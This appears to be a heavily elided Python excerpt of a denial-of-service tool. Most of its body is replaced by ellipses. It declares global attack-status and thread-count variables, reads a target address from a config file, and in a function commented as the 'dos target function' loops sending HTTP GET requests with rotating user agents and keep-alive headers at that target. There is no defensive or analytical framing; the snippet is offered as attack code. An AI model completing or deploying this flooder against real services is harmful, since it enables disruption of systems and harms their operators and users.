...
def main():
    global ATTACKING_STATUS, THREADS_COUNT, DELAY_BETWEEN_CONNECTIONS, RUNNING_THREADS, USER_AGENTS
...
def get_options():
    ...
    TARGET = str(config["Configuration"]["TARGET_RESOLVER"]).replace("\"", "")
...
#dos target function
def dos():
    global ATTACKING_STATUS, TARGET, DELAY_BETWEEN_CONNECTIONS, RUNNING_THREADS, USER_AGENTS
    ...
    while ATTACKING_STATUS:
        ...
        try:
            ...
            try:
                ...
                headers = {"User-Agent": random_choice(USER_AGENTS), "Connection": "keep-alive"}
                while ATTACKING_STATUS:
                    ...
                    try:
                        ...
                        worker.get(TARGET, headers=headers, allow_redirects=True, timeout=30)
